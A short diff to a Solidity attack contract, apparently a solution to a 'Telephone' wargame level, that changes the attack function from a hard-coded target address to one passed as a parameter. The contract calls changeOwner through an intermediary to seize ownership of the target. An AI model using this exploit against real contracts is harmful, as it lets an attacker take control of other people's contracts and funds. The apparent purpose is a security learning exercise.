@@ -6,9 +6,7 @@ abstract contract Telephone {
 }
 
 contract Attacker4 {
-    Telephone target = Telephone(0x90429046BD403440B6a3672A4eFdcfA922650115);
-
-    function attack() external {
-        target.changeOwner(msg.sender);
+    function attack(address targetAddr) external {
+        Telephone(targetAddr).changeOwner(msg.sender);
     }
 }
